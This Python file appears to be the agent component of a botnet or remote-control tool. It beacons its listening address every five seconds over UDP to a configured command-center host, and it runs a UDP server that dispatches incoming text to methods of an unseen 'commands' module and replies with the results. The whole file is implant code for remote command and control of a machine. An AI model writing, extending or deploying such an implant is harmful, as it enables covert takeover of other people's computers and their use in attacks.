#!/usr/bin/env python
# -*- coding: utf-8 -*-

"""
  Pawel Wylecial
  h0wl@cc-team.org

  Matt Harasymczuk
  matt@harasymczuk.pl
  www.matt.harasymczuk.pl
"""

import SocketServer
import threading
import socket

from __init__ import *
import commands


def ping():
    """
      sends ping to command center
      ping contains 'host_addr:port' eg. '127.0.0.1:1024'
    """
    UDPSock.sendto("%s:%s" % (PAYLOAD_LISTEN_HOST, PAYLOAD_LISTEN_PORT),
                   (COMMAND_CENTER_HOST, COMMAND_CENTER_PORT))
    logging.debug('Ping sent to "%s:%s" contains "%s:%s"' % (
    COMMAND_CENTER_HOST, COMMAND_CENTER_PORT, PAYLOAD_LISTEN_HOST,
    PAYLOAD_LISTEN_PORT))
    threading.Timer(5.0, ping).start()


UDPSock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
# PAYLOAD_LISTEN_HOST = socket.gethostbyname(socket.gethostname())
t = threading.Timer(5.0, ping)
t.start()


class UDPHandler(SocketServer.BaseRequestHandler):
    def handle(self):
        request = self.request[0].strip()
        socket = self.request[1]

        logging.debug('Request from %s:%s "%s"' % (
        self.client_address[0], self.client_address[1], request))
        cmd = commands.commands(socket)

        args = request.count(' ')

        if args >= 1:
            request, argument = request.split(' ', 1)
            msg = getattr(cmd, request.lower())(argument)

        elif args == 0:
            msg = getattr(cmd, request.lower())()

        else:
            msg = '400 [Error] Bad Request: %s' % detail
            logging.error(msg)

        socket.sendto(msg,
                      (self.client_address[0], self.client_address[1] + 1))


if __name__ == "__main__":
    logging.info("Payload is listening on %s:%s..." % (
    PAYLOAD_LISTEN_HOST, PAYLOAD_LISTEN_PORT))
    listener = SocketServer.UDPServer(
        (PAYLOAD_LISTEN_HOST, PAYLOAD_LISTEN_PORT), UDPHandler)

    try:
        listener.serve_forever()
    except KeyboardInterrupt:
        commands.commands(listener).kill()
        t.cancel()
        UDPSock.close()
